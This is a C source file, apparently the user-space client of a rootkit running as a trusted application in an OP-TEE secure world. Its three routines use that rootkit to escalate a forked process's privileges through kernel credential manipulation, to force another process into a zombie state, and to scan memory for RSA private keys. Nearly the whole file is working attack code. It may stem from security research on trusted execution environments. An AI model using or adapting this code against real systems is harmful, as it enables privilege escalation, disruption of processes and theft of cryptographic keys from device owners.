#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <err.h>
#include <tee_client_api.h>

// Must match rootkit TA configuration, see rootkit_pta.h
#define ROOTKIT_TA_UUID \
    { 0x90998449, 0xb9e7, 0x483b, \
    { 0x96, 0x1c, 0x25, 0x1f, 0x2a, 0x3f, 0x50, 0xe5 } }
#define ELEVATE_PRIVILEGES 0
#define MEMORY_CARVING 1
#define CHANGE_TASK_STATE 2

// include/linux/sched.h
#define TASK_DEAD 0x0080
#define EXIT_ZOMBIE 0x0020


char key[] = "-----BEGIN RSA PRIVATE KEY----- user-test-key -----END RSA PRIVATE KEY-----";


void elevate_privileges()
{
    pid_t cpid = fork();
    if (cpid)
    {
        TEEC_Result res;
        TEEC_Context ctx;
        TEEC_Session sess;
        TEEC_Operation op;
        TEEC_UUID uuid = ROOTKIT_TA_UUID;
        uint32_t err_origin;
        pid_t ppid = getppid();

        printf("ppid: %d\n", ppid);
        printf("cpid: %d\n", cpid);

        res = TEEC_InitializeContext(NULL, &ctx);
        if (res != TEEC_SUCCESS)
            errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

        res = TEEC_OpenSession(&ctx, &sess, &uuid,
                            TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
        if (res != TEEC_SUCCESS)
            errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);

        memset(&op, 0, sizeof(TEEC_Operation));
        op.params[0].value.a = ppid;
        op.params[1].value.a = cpid;
        op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE);

        res = TEEC_InvokeCommand(&sess, ELEVATE_PRIVILEGES, &op, &err_origin);
        if (res != TEEC_SUCCESS)
            warnx(1, "TEEC_InvokeCommand ELEVATE_PRIVILEGES failed with code 0x%x origin 0x%x", res, err_origin);

        kill(cpid, SIGKILL);

        TEEC_CloseSession(&sess);
        TEEC_FinalizeContext(&ctx);
    }
    else
    {
        // Use access syscall to trigger difference between task_struct.cred and task_struct.real_cred
        while (1)
            access("/tmp/ro", S_IWOTH);
    }
}


void print_file_mtime(char const *const filename)
{
    struct stat buf;
    int result = stat(filename, &buf);
    if (result == 0)
        printf("st_mtime: %lu\n", buf.st_mtime);
}


void monitor_file_mtime(char const *const filename, const uint16_t num_attempts, const unsigned int usleep_interval)
{
    for (uint16_t i = 0; i < num_attempts; i++)
    {
        print_file_mtime(filename);
        usleep(usleep_interval);
    }
}


void print_process_status(pid_t pid)
{
    char buffer[64];
    snprintf(buffer, 64, "head -n3 /proc/%d/status | tail -n1 | cut -f2", pid);
    system(buffer);
}


void starve_task()
{
    const uint8_t NUM_STARVATION_CHECKS = 10;

    pid_t cpid = fork();
    if (cpid)
    {
        TEEC_Result res;
        TEEC_Context ctx;
        TEEC_Session sess;
        TEEC_Operation op;
        TEEC_UUID uuid = ROOTKIT_TA_UUID;
        uint32_t err_origin;

        printf("cpid: %d\n", cpid);

        res = TEEC_InitializeContext(NULL, &ctx);
        if (res != TEEC_SUCCESS)
            errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

        res = TEEC_OpenSession(&ctx, &sess, &uuid,
                            TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
        if (res != TEEC_SUCCESS)
            errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);

        memset(&op, 0, sizeof(TEEC_Operation));
        op.params[0].value.a = cpid;
        op.params[1].value.a = EXIT_ZOMBIE;
        op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE);

        printf("before\n");
        monitor_file_mtime("/tmp/starving", NUM_STARVATION_CHECKS, 1000000);

        printf("child status:\n");
        print_process_status(cpid);

        res = TEEC_InvokeCommand(&sess, CHANGE_TASK_STATE, &op, &err_origin);
        if (res != TEEC_SUCCESS)
            warnx(1, "TEEC_InvokeCommand CHANGE_TASK_STATE failed with code 0x%x origin 0x%x", res, err_origin);

        printf("after\n");
        monitor_file_mtime("/tmp/starving", NUM_STARVATION_CHECKS, 1000000);

        printf("child status:\n");
        print_process_status(cpid);

        kill(cpid, SIGKILL);

        TEEC_CloseSession(&sess);
        TEEC_FinalizeContext(&ctx);
    }
    else
    {
        // Open file to monitor process activity.
        while (1)
        {
            FILE *f = fopen("/tmp/starving", "w");
            fclose(f);
        }
    }
}


void find_rsa_keys()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = ROOTKIT_TA_UUID;
    uint32_t err_origin;

    char signature_begin[] = "-----BEGIN RSA PRIVATE KEY-----";
    char signature_end[] = "-----END RSA PRIVATE KEY-----";

    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                        TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);

    memset(&op, 0, sizeof(TEEC_Operation));
    op.params[0].tmpref.buffer = signature_begin;
    op.params[0].tmpref.size = strlen(signature_begin);
    op.params[1].tmpref.buffer = signature_end;
    op.params[1].tmpref.size = strlen(signature_end);
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);

    res = TEEC_InvokeCommand(&sess, MEMORY_CARVING, &op, &err_origin);
    if (res != TEEC_SUCCESS)
        warnx(1, "TEEC_InvokeCommand MEMORY_CARVING failed with code 0x%x origin 0x%x", res, err_origin);

    TEEC_CloseSession(&sess);
    TEEC_FinalizeContext(&ctx);
}


int main(int argc, char *argv[])
{
    elevate_privileges();
    starve_task();
    find_rsa_keys();
    return 0;
}
